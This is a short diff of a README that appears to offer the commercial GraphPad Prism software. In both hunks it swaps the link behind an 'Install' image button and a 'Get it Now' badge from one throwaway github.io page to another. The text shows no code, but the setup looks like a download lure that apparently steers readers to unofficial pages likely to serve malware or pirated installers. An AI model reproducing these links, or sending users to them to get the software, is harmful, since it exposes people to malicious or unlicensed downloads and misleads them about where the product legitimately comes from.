@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/graphPadPrism)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://stul-stol.github.io/.github/graphPadPrism)
 
 </div>
 
@@ -81,7 +81,7 @@ GraphPad Prism's position as the standard tool in academic life science research
 
 <p align="center">
 
-[![Get it Now GraphPad Prism](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/graphPadPrism)
+[![Get it Now GraphPad Prism](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://stul-stol.github.io/.github/graphPadPrism)
 
 </p>
 
